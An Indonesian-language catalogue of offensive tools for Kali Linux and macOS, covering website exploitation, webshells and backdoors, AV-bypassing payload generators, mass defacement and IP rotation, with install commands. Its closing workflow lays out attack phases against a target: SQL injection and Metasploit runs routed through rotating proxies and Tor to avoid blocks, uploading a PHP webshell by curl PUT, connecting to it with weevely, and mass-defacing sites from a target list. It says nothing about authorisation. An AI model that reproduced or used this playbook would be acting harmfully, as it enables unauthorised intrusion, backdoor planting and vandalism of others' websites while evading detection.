# 📦 TOOLS HACKING CLI — KALI LINUX & macOS

**Kategori:** Exploit Website · Backdoor Website · Deface Website · IP Rotation · Burp Suite CLI  
**Sumber:** Open Source (GitHub)  
**Platform:** Kali Linux ✅ | macOS ✅ | Cross-Platform ✅

---

## 🚀 I. EXPLOIT WEBSITE

Tools untuk mengeksploitasi kerentanan website: SQLi, XSS, LFI/RFI, OS Command Injection, RCE, dsb.

| # | Tools | Deskripsi | Bahasa | Repo GitHub |
|---|-------|-----------|--------|-------------|
| 1 | **Metasploit Framework** | Framework exploit paling komplit. Ribuan module: RCE, LFI, SQLi, upload backdoor, reverse shell, dll. Wajib punya. | Ruby | [github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework) |
| 2 | **SQLMap** | Auto SQL injection & database takeover. Support 34+ database (MySQL, PostgreSQL, Oracle, MSSQL, dll). | Python | [github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap) |
| 3 | **Commix** | Automated OS Command Injection exploitation. Bisa auto upload webshell via injeksi. | Python | [github.com/commixproject/commix](https://github.com/commixproject/commix) |
| 4 | **BeEF (Browser Exploitation Framework)** | Exploit browser target via XSS. Hook browser → execute module remote. | Ruby/JS | [github.com/beefproject/beef](https://github.com/beefproject/beef) |
| 5 | **SET (Social Engineering Toolkit)** | Social engineering + web attack vectors: phishing, credential harvesting, web jacking. | Python | [github.com/trustedsec/social-engineer-toolkit](https://github.com/trustedsec/social-engineer-toolkit) |
| 6 | **AutoPWN Suite** | Auto discovery-to-exploit pipeline: scan service → lookup vuln → suggest exploit. Cross-platform Python. | Python | [github.com/kaan-gultekin/autopwn-suite](https://github.com/kaan-gultekin/autopwn-suite) |
| 7 | **AutoSploit** | Automated mass exploiter via Shodan API → auto pilih module Metasploit. | Python | [github.com/NullArray/AutoSploit](https://github.com/NullArray/AutoSploit) |
| 8 | **WPscan** | Black box WordPress vulnerability scanner. Deteksi versi WP, plugin, theme, user enum. | Ruby | [github.com/wpscanteam/wpscan](https://github.com/wpscanteam/wpscan) |
| 9 | **WPSploit** | Exploit WordPress-powered sites via Metasploit modules. | Ruby | [github.com/m4ll0k/WPSploit](https://github.com/m4ll0k/WPSploit) |
| 10 | **WordPress Exploit Framework (WPXF)** | Ruby framework exploit WordPress: auto enum, exploit plugin/theme vuln. | Ruby | [github.com/rastating/wordpress-exploit-framework](https://github.com/rastating/wordpress-exploit-framework) |
| 11 | **tplmap** | Server-Side Template Injection (SSTI) exploitation & web server takeover. | Python | [github.com/epinna/tplmap](https://github.com/epinna/tplmap) |
| 12 | **XSSer** | Automated XSS detection & exploitation framework. | Python | [github.com/epsylon/xsser](https://github.com/epsylon/xsser) |
| 13 | **liffy** | Local File Inclusion (LFI) exploitation tool — auto shell via LFI. | Python | [github.com/mzfr/liffy](https://github.com/mzfr/liffy) |
| 14 | **fimap** | LFI/RFI exploitation tool — auto get shell via file inclusion. | Python | [github.com/kurobeats/fimap](https://github.com/kurobeats/fimap) |
| 15 | **jboss-autopwn** | JBoss JMX console exploit → deploy webshell otomatis. | Python | [github.com/SpiderLabs/jboss-autopwn](https://github.com/SpiderLabs/jboss-autopwn) |
| 16 | **dDumper** | Drupal vulnerability scanner & auto exploiter. | Python | [github.com/rezasp/dDumper](https://github.com/rezasp/dDumper) |
| 17 | **nuclei** | Fast vulnerability scanner berdasarkan YAML templates. Ribuan template exploit. | Go | [github.com/projectdiscovery/nuclei](https://github.com/projectdiscovery/nuclei) |
| 18 | **Nikto** | Web server scanner — deteksi ribuan potensi exploit & misconfig. | Perl | [github.com/sullo/nikto](https://github.com/sullo/nikto) |
| 19 | **Wfuzz** | Web fuzzer untuk parameter discovery, directory brute, injection point. | Python | [github.com/xmendez/wfuzz](https://github.com/xmendez/wfuzz) |
| 20 | **FFUF** | Go-based fast web fuzzer. Buat directory/parameter discovery & brute. Super cepat. | Go | [github.com/ffuf/ffuf](https://github.com/ffuf/ffuf) |
| 21 | **WhatWaf** | Deteksi WAF (Web Application Firewall) & generate bypass payload otomatis. | Python | [github.com/Ekultek/WhatWaf](https://github.com/Ekultek/WhatWaf) |
| 22 | **Grabber** | Web app scanner untuk XSS, SQLi, file inclusion, backup file check. | Python | [github.com/romaingautier/grabber](https://github.com/romaingautier/grabber) |
| 23 | **Wapiti** | Web vulnerability scanner black-box. Deteksi SQLi, XSS, file disclosure, command injection. | Python | [github.com/wapiti-scanner/wapiti](https://github.com/wapiti-scanner/wapiti) |
| 24 | **Arachni** | Web app security scanner framework. Support CLI mode. | Ruby | [github.com/Arachni/arachni](https://github.com/Arachni/arachni) |
| 25 | **OWASP ZAP** | Full-featured web app scanner. Bisa di-run via CLI/daemon. | Java | [github.com/zaproxy/zaproxy](https://github.com/zaproxy/zaproxy) |

---

## 🔙 II. BACKDOOR WEBSITE

Tools untuk membuat, upload, dan manage webshell/backdoor di web server target.

| # | Tools | Deskripsi | Bahasa | Repo GitHub |
|---|-------|-----------|--------|-------------|
| 1 | **Weevely3** | Weaponized PHP web shell — post-exploitation. 30+ module: shell, SQL console, proxy, port scan, file upload, reverse TCP. | Python | [github.com/epinna/weevely3](https://github.com/epinna/weevely3) |
| 2 | **Kali webshells (official)** | Official Kali package — koleksi webshell ASP, ASPX, CFM, JSP, Perl, PHP. | Multi | [gitlab.com/kalilinux/packages/webshells](https://gitlab.com/kalilinux/packages/webshells) |
| 3 | **tennc/webshell** | ★10.7k stars — koleksi webshell lengkap: PHP, JSP, ASP, ASPX, Python, PowerShell. | Multi | [github.com/tennc/webshell](https://github.com/tennc/webshell) |
| 4 | **b374k shell** | PHP webshell dengan file manager, command exec, SQL explorer, shell. | PHP | [github.com/b374k/b374k](https://github.com/b374k/b374k) |
| 5 | **p0wny-shell** | Single-file PHP webshell, simple & efisien. | PHP | [github.com/flozz/p0wny-shell](https://github.com/flozz/p0wny-shell) |
| 6 | **SecLists (webshells)** | Koleksi wordlist & payload termasuk webshells oleh Daniel Miessler. | Multi | [github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) |
| 7 | **TheFatRat** | Generate backdoor + payload yang bypass AV. Support Windows/Android/macOS. | Bash/Python | [github.com/screetsec/TheFatRat](https://github.com/screetsec/TheFatRat) |
| 8 | **Backdoor Factory** | Patch backdoor ke dalam binary PE/ELF/Mach-O files. | Python | [github.com/secretsquirrel/the-backdoor-factory](https://github.com/secretsquirrel/the-backdoor-factory) |
| 9 | **Shellter** | Dynamic shellcode injection tool — AV bypass. | Pascal | [github.com/george-insomniac/shellter](https://github.com/george-insomniac/shellter) |
| 10 | **Pupy** | Cross-platform RAT (Windows/Linux/macOS/Android). Post-exploitation via Python. | Python | [github.com/n1nj4sec/pupy](https://github.com/n1nj4sec/pupy) |
| 11 | **CKnife** | Cross-platform webshell management tool. Support macOS. | Java | [github.com/Chora10/Cknife](https://github.com/Chora10/Cknife) |
| 12 | **AntSword** | Open source webshell manager — cross-platform (macOS/Linux/Windows). | Node.js | [github.com/AntSwordProject/antSword](https://github.com/AntSwordProject/antSword) |
| 13 | **Godzilla** | Webshell management tool, encrypted communication, bypass WAF. | Java | [github.com/BeichenDream/Godzilla](https://github.com/BeichenDream/Godzilla) |
| 14 | **weevely3-Backconnect** | Fork weevely dengan fitur backconnect shell. | Python | [github.com/slemanboys/Weevely-Backconnect](https://github.com/slemanboys/Weevely-Backconnect) |
| 15 | **Hwacha** | Post-exploitation tool — execute payload via SSH ke banyak host simultan. | Python | [github.com/n00py/Hwacha](https://github.com/n00py/Hwacha) |

---

## 🏴 III. DEFACE WEBSITE

Tools khusus deface — umumnya exploit WebDAV (PUT request), upload index replacement, atau injeksi massal.

| # | Tools | Deskripsi | Bahasa | Repo GitHub |
|---|-------|-----------|--------|-------------|
| 1 | **Defacer (readloud)** | Auto deface via WebDAV vulnerability (unauthenticated PUT). Python, cross-platform. | Python | [github.com/readloud/defacer](https://github.com/readloud/defacer) |
| 2 | **white-deface** | WebDav mass deface tool. Cari vuln WebDAV + auto inject page deface. | Python | [github.com/WH1T3-E4GL3/white-deface](https://github.com/WH1T3-E4GL3/white-deface) |
| 3 | **Massive-WebDav** | Mass deface WebDAV — "for lazy haxxers". | Python | [github.com/ZechBron/Massive-WebDav](https://github.com/ZechBron/Massive-WebDav) |
| 4 | **D3FACER** | Auto-defacer multi-site dalam waktu singkat. | Python | [github.com/The404Hacking/D3FACER](https://github.com/The404Hacking/D3FACER) |
| 5 | **Deface-X** | Auto deface tool inject website massal. | Python | [github.com/Whomrx666/Deface-X](https://github.com/Whomrx666/Deface-X) |
| 6 | **Tools-deface (wanzxploit)** | Simulasi deface menggunakan cURL WebDAV. | Python | [github.com/wanzxploit/Tools-deface](https://github.com/wanzxploit/Tools-deface) |
| 7 | **DarkCool All Tools** | All-in-one: exploiter, checker, webshell finder, grabber, brute, deface. | Python | [github.com/D4rkC0ol/DarkCool-Tools](https://github.com/D4rkC0ol/DarkCool-Tools) |
| 8 | **Zero-Attacker** | Multipurpose hacking tool dengan 15+ module, termasuk deface. | Python | [github.com/LIGHT-HACKER/Zero-Attacker](https://github.com/LIGHT-HACKER/Zero-Attacker) |
| 9 | **DAVTest** | Test WebDAV server — deteksi file upload vulnerability. | Perl | [github.com/cldrn/davtest](https://github.com/cldrn/davtest) |
| 10 | **WebSploit** | Framework exploit termasuk web deface module (WebDAV). | Python | [github.com/The404Hacking/websploit](https://github.com/The404Hacking/websploit) |

---

## 🔄 IV. IP ROTATION — BIAR RECON & EXPLOIT LANCAR

Tools untuk rotate IP address otomatis agar tidak kena rate limit/block saat scanning & exploitation.

| # | Tools | Deskripsi | Bahasa | Repo GitHub |
|---|-------|-----------|--------|-------------|
| 1 | **ProxyChains-NG** | Route traffic tools CLI lewat proxy chain. Wajib punya. Kombinasikan dengan Tor/proxy list. | C | [github.com/rofl0r/proxychains-ng](https://github.com/rofl0r/proxychains-ng) |
| 2 | **Mubeng** ⭐ | Proxy checker + IP rotator super cepat. Go binary, cross-platform. Rotate per N request. ★2k | Go | [github.com/kitabisa/mubeng](https://github.com/kitabisa/mubeng) |
| 3 | **AnonSurf (Kali)** | System-wide Tor routing + auto IP rotation. Khusus Kali Linux. | Bash | [github.com/Und3rf10w/kali-anonsurf](https://github.com/Und3rf10w/kali-anonsurf) |
| 4 | **Rota** ⭐ | High-performance proxy rotation engine. Self-hosted. Support HTTP/SOCKS4/SOCKS5. Method: random, roundrobin, least_conn, time_based. Cross-platform. | Go | [github.com/alpkeskin/rota](https://github.com/alpkeskin/rota) |
| 5 | **ProxyBroker2** | Auto cari proxy dari 50+ sumber → check alive → serve rotating proxy server. | Python | [github.com/bluet/proxybroker2](https://github.com/bluet/proxybroker2) |
| 6 | **ZeroTrace** | System-wide anonymization via Tor + auto IP rotation. Python. | Python | [github.com/s-r-e-e-r-a-j/ZeroTrace](https://github.com/s-r-e-e-r-a-j/ZeroTrace) |
| 7 | **IP Changer (Anon4You)** | Auto rotate IP via Tor + Privoxy. Set interval custom. | Bash/Python | [github.com/Anon4You/Ip-Changer](https://github.com/Anon4You/Ip-Changer) |
| 8 | **Rotating Tor HTTP Proxy (Docker)** | Satu HTTP proxy endpoint dengan banyak Tor exit nodes di belakang (HAProxy round-robin). | Docker | [github.com/zhaow-de/rotating-tor-http-proxy](https://github.com/zhaow-de/rotating-tor-http-proxy) |
| 9 | **IPRotate (Burp Extension)** | Rotate IP tiap request di Burp Suite via AWS API Gateway. Setiap request IP beda. | Python | [github.com/RhinoSecurityLabs/IPRotate_Burp_Extension](https://github.com/RhinoSecurityLabs/IPRotate_Burp_Extension) |
| 10 | **FireProx** | Create AWS API Gateway endpoint yang auto rotate IP tiap request. | Python | [github.com/ustayready/fireprox](https://github.com/ustayready/fireprox) |
| 11 | **gofireprox** | FireProx versi Go. Lebih ringan. | Go | [github.com/mr-pmillz/gofireprox](https://github.com/mr-pmillz/gofireprox) |
| 12 | **Tor Proxy (Docker)** | Rotating TOR proxy dengan Docker — multiple Tor instances di belakang HAProxy. | Docker | [github.com/mattes/rotating-proxy](https://github.com/mattes/rotating-proxy) |
| 13 | **tor-rotate-proxy** | Dockerfile untuk Tor proxies jadi rotate proxy. | Docker | [github.com/mlvzk/tor-rotate-proxy](https://github.com/mlvzk/tor-rotate-proxy) |

---

## 🧪 V. BURP SUITE CLI (HEADLESS & AUTOMATION)

Burp Suite bisa dijalankan **via command line (headless)** untuk automation scan, REST API, dan integrasi CI/CD. Tools-tools di bawah ini memungkinkan Burp dipakai full CLI tanpa GUI.

### 🔹 1. Burp Suite — Native CLI (Official)

Burp Suite sendiri bisa dijalankan dari terminal dengan berbagai argument.

**Cara install:**
```bash
# Kali Linux
sudo apt install burpsuite

# macOS — download .jar dari portswigger.net atau pakai brew
brew install --cask burp-suite
```

**CLI Arguments Lengkap:**
```bash
# Basic — langsung buka GUI
java -jar burpsuite.jar

# Headless mode (tanpa GUI) — untuk server/automation
java -jar -Djava.awt.headless=true burpsuite.jar

# Headless + set memory 4GB
java -jar -Xmx4g -Djava.awt.headless=true burpsuite.jar

# Headless + project file + config
java -jar -Djava.awt.headless=true burpsuite.jar \
  --project-file=project.burp \
  --config-file=config.json

# Headless + config + collab server + rest API
java -jar -Djava.awt.headless=true burpsuite.jar \
  --project-file=project.burp \
  --config-file=config.json \
  --collaborator-server \
  --rest-api
```

> **Catatan:** Burp Suite Professional memiliki REST API built-in yang bisa di-enable via `--rest-api`. Community Edition tidak punya REST API — untuk itu perlu burp-rest-api extension.

**Sumber:** [portswigger.net/burp/documentation/desktop/troubleshooting/launch-from-command-line](https://portswigger.net/burp/documentation/desktop/troubleshooting/launch-from-command-line)

---

### 🔹 2. Burp REST API (VMware) ⭐

REST/JSON API untuk Burp Suite — memungkinkan Burp dioperasikan full via HTTP request. Support headless mode.

| Item | Detail |
|------|--------|
| **Fungsi** | REST API wrapper untuk Burp — scan, spider, proxy config via API |
| **GitHub** | [github.com/vmware/burp-rest-api](https://github.com/vmware/burp-rest-api) |
| **Bahasa** | Java |
| **Lisensi** | BSD-2 |
| **Dependensi** | Burp Suite Professional JAR |

**Cara pakai:**
```bash
# Run headless
java -jar burp-rest-api.jar \
  --headless.mode=true \
  --burp.jar=./lib/burpsuite_pro.jar

# Run dengan config
java -jar burp-rest-api.jar \
  --headless.mode=true \
  --burp.jar=./lib/burpsuite_pro.jar \
  --config-file=burp_config.json

# Custom port & API key
java -jar burp-rest-api.jar \
  --headless.mode=true \
  --burp.jar=./lib/burpsuite_pro.jar \
  --server.port=8090 \
  --server.address=0.0.0.0 \
  --customApiKey=supersecret123
```

**REST API Endpoints:**
```
POST /burp/scan              → Start scan
GET  /burp/scan/<id>         → Cek status scan
GET  /burp/issues            → List vuln findings
POST /burp/spider            → Start spidering
GET  /burp/proxy/history     → Proxy history
POST /burp/stop              → Stop Burp
```

---

### 🔹 3. Headless Burp Scanner (NetsOSS)

Burp Extension untuk menjalankan Spider & Scanner via command-line. Bisa generate report JUnit/HTML/XML.

| Item | Detail |
|------|--------|
| **Fungsi** | Run Burp Spider + Active Scanner via CLI, generate report |
| **GitHub** | [github.com/NetsOSS/headless-burp](https://github.com/NetsOSS/headless-burp) |
| **Bahasa** | Java |
| **Install** | Via BApp Store atau download JAR |

**Cara pakai:**
```bash
java -Xmx4G -Djava.awt.headless=true \
  -classpath headless-burp-scanner.jar:burpsuite_pro.jar \
  burp.StartBurp \
  --unpause-spider-and-scanner \
  --project-file=target.burp \
  -c config.xml
```

**CLI Options:**
```
--project-file=VAL              Project file (mandatory)
-c (--config) <file>            Config file (mandatory)
-p (--prompt)                   Confirm shutdown
--unpause-spider-and-scanner    Auto start spider & scanner
```

---

### 🔹 4. Burpa — Burp Automator (tristanlatr)

High-level CLI & Python interface untuk Burp Suite scanner. Paling praktis buat automation scan via terminal.

| Item | Detail |
|------|--------|
| **Fungsi** | CLI & Python API untuk Burp scan automation |
| **GitHub** | [github.com/tristanlatr/burpa](https://github.com/tristanlatr/burpa) |
| **Bahasa** | Python |
| **Instal** | `pip install burpa` |
| **Dependensi** | Burp Professional + burp-rest-api |

**Cara pakai CLI:**
```bash
# Scan URL
burpa scan http://mysite.com http://mysite2.com \
  --report-output-dir ./burp-reports/

# Scan dengan authentication
burpa scan http://mysite.com \
  --report-output-dir ./burp-reports/ \
  --app-user=admin \
  --app-pass=P@ssw0rd

# Spider only
burpa spider http://mysite.com

# Generate report
burpa report --report-output-dir ./burp-reports/ --report-type html
```

**Python API:**
```python
from burpa import Burpa
burpa = Burpa(api_url="http://127.0.0.1:8090")
burpa.scan("http://target.com")
issues = burpa.get_issues()
```

---

### 🔹 5. Burpa — Burp Automator (0x4D31)

Versi lain Burp Automator dengan dukungan Slack reporting.

| Item | Detail |
|------|--------|
| **Fungsi** | Burp automation via CLI + Slack integration |
| **GitHub** | [github.com/0x4D31/burpa](https://github.com/0x4D31/burpa) |
| **Bahasa** | Python |

**Cara pakai:**
```bash
python burpa.py http://target.com \
  -a scan \
  -pP 8080 \
  -aP 8090 \
  -rT HTML \
  -r all \
  -sR \
  -sAT xoxb-xxxxxxxxxxx
```

---

### 🔹 6. Burp Automation Script (justmorpheus)

Full automation script untuk Burp Professional — includes multiple extensions (JSLinkFinder, active-scan-plus-plus, additional-scanner-checks).

| Item | Detail |
|------|--------|
| **Fungsi** | Automated scanning pipeline dengan multiple extensions |
| **GitHub** | [github.com/justmorpheus/burp-automation](https://github.com/justmorpheus/burp-automation) |
| **Bahasa** | Bash + Python + Robot Framework |

**Cara pakai:**
```bash
git clone https://github.com/justmorpheus/burp-automation.git
cd burp-automation
bash automation.sh https://target.com
```

---

### 🔹 Burp Suite CLI — Quick Reference

```bash
# 1. Jalankan Burp headless (native CLI)
java -jar -Xmx4g -Djava.awt.headless=true burpsuite.jar \
  --project-file=project.burp \
  --config-file=config.json

# 2. Jalankan Burp REST API (VMware)
java -jar burp-rest-api.jar \
  --headless.mode=true \
  --burp.jar=./lib/burpsuite_pro.jar \
  --server.port=8090

# 3. Scan via burpa CLI
burpa scan http://target.com --report-output-dir ./reports/

# 4. Rotate IP di Burp via IPRotate
# Install IPRotate extension → load IPRotate.py
# Configure AWS API Gateway → setiap request IP berubah otomatis

# 5. Route Burp traffic via rotating proxy
# Set upstream proxy di Burp → 127.0.0.1:8089 (Mubeng rotator)
# Atau pakai ProxyChains
proxychains4 java -jar burpsuite.jar
```

---

## 📥 VI. INSTALASI

### 🔹 Kali Linux

```bash
# Exploit tools
sudo apt install metasploit-framework sqlmap commix beef-xss set wpscan nikto wfuzz ffuf whatwaf

# Backdoor tools
sudo apt install weevely webshells backdoor-factory shellnoob

# Deface tools
sudo apt install davtest

# IP Rotation
sudo apt install proxychains4 anonsurf

# Burp Suite
sudo apt install burpsuite

# Metapackage lengkap
sudo apt install kali-tools-exploitation kali-tools-web
```

### 🔹 macOS (via Homebrew)

```bash
# ProxyChains
brew install proxychains-ng

# Burp Suite
brew install --cask burp-suite

# Go-based tools (Mubeng, Rota, FFUF, nuclei, gofireprox)
brew install go
go install github.com/kitabisa/mubeng@latest
go install github.com/alpkeskin/rota@latest
go install github.com/ffuf/ffuf@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install github.com/mr-pmillz/gofireprox/cmd/gofireprox@latest

# Python tools (via pip)
pip install sqlmap git+https://github.com/bluet/proxybroker2.git
pip install wapiti3 xsser whatwaf burpa

# Ruby tools
gem install wpscan

# Docker-based IP rotation
docker pull zhaowde/rotating-tor-http-proxy
docker pull mattes/rotating-proxy
```

### 🔹 Install via Git (Cross-Platform)

```bash
# Commix
git clone https://github.com/commixproject/commix.git && cd commix && python commix.py -h

# AutoPWN Suite
git clone https://github.com/kaan-gultekin/autopwn-suite.git && cd autopwn-suite && pip install -r requirements.txt

# AutoSploit
git clone https://github.com/NullArray/AutoSploit.git && cd AutoSploit && pip install -r requirements.txt

# Weevely3
git clone https://github.com/epinna/weevely3.git && cd weevely3 && pip install -r requirements.txt

# TheFatRat
git clone https://github.com/screetsec/TheFatRat.git && cd TheFatRat && chmod +x setup.sh && ./setup.sh

# b374k shell
git clone https://github.com/b374k/b374k.git

# tennc/webshell (koleksi webshell)
git clone https://github.com/tennc/webshell.git

# Defacer
git clone https://github.com/readloud/defacer.git && cd defacer && pip install -r requirements.txt

# ZeroTrace
git clone https://github.com/s-r-e-e-r-a-j/ZeroTrace.git && cd ZeroTrace && python install.py

# Rota
git clone https://github.com/alpkeskin/rota.git && cd rota && go build -o rota .

# FireProx
git clone https://github.com/ustayready/fireprox.git && cd fireprox && pip install -r requirements.txt

# Burp REST API (VMware)
git clone https://github.com/vmware/burp-rest-api.git && cd burp-rest-api
# Build: mvn clean package atau download release JAR

# Burp Automator (burpa)
pip install burpa

# Headless Burp Scanner
git clone https://github.com/NetsOSS/headless-burp.git

# Burp Automation (justmorpheus)
git clone https://github.com/justmorpheus/burp-automation.git
```

---

## ⚙️ VII. WORKFLOW KOMBINASI TERBAIK

### 📋 Recon Phase (IP rotation aktif)

```bash
# Terminal 1: Start proxy rotator
mubeng -a localhost:8089 -f live_proxies.txt -r 10 -m random

# Terminal 2: Tools jalan lewat proxy rotator
proxychains4 nmap -sS -p80,443 target.com
proxychains4 ffuf -u http://target.com/FUZZ -w wordlist.txt
proxychains4 gobuster dir -u http://target.com -w wordlist.txt
proxychains4 nuclei -u http://target.com -t cves/ -o results.txt
```

### 📋 Exploit Phase (IP rotation aktif)

```bash
# Via ProxyChains + Mubeng
proxychains4 sqlmap -u "http://target.com/page?id=1" --batch --random-agent
proxychains4 python3 exploit.py -u http://target.com
proxychains4 msfconsole -q -x "use exploit/multi/http/...; set RHOSTS target.com; run"

# Atau via Tor + Auto IP rotation
sudo anonsurf start
sudo watch -n 30 anonsurf change   # ganti IP tiap 30 detik
python3 exploit.py -u http://target.com
```

### 📋 Burp Suite + IP Rotation

```bash
# Terminal 1: Start Mubeng rotator
mubeng -a localhost:8089 -f live_proxies.txt -r 5 -m random

# Terminal 2: Jalankan Burp dengan upstream proxy ke rotator
# Setting di Burp: Project Options → Connections → Upstream Proxy Servers
# → 127.0.0.1:8089 (SOCKS5 or HTTP)

# Atau pake ProxyChains
proxychains4 java -jar -Djava.awt.headless=true burpsuite.jar \
  --project-file=scan.burp \
  --config-file=config.json

# Atau Burp REST API headless untuk automation scan
java -jar burp-rest-api.jar \
  --headless.mode=true \
  --burp.jar=./lib/burpsuite_pro.jar \
  --server.port=8090

# Scan via burpa CLI dari terminal lain
burpa scan http://target.com --report-output-dir ./reports/
```

### 📋 Backdoor Phase

```bash
# Upload webshell lewat proxy rotator
proxychains4 curl -X PUT -T shell.php http://target.com/uploads/shell.php

# Weevely3 connect via proxy
proxychains4 weevely http://target.com/uploads/shell.php password

# Atau langsung Tor
torsocks weevely http://target.com/shell.php password
```

### 📋 Deface Phase

```bash
# Scan + deface lewat proxy rotator
proxychains4 python3 white-deface.py -l targets.txt -p index.html
proxychains4 python3 defacer.py -i targets.txt -p deface.html
```

---

## 📊 VIII. RINGKASAN TOOLS DI KALI LINUX

Berikut tools yang sudah include di repositori resmi Kali dan bisa langsung `apt install`:

```
# Exploitation
metasploit-framework     # ★ Framework exploit utama
sqlmap                   # ★ SQL Injection auto
commix                   # ★ OS Command Injection
beef-xss                 # ★ Browser exploitation via XSS
set                      # ★ Social Engineering Toolkit
wpscan                   # ★ WordPress scanner
nikto                    # Web server scanner
wfuzz                    # Web fuzzer
whatwaf                  # WAF detection & bypass

# Backdoor
weevely                  # ★ Weaponized web shell
webshells                # ★ Koleksi webshell official
backdoor-factory         # Patch backdoor ke binary
shellnoob                # Shellcode generator

# IP Rotation
proxychains4             # ★ Proxy chain untuk semua tools
anonsurf                 # ★ Auto IP rotate via Tor (Kali)

# Burp Suite
burpsuite                # ★ Web app security testing platform (GUI + CLI)
```

---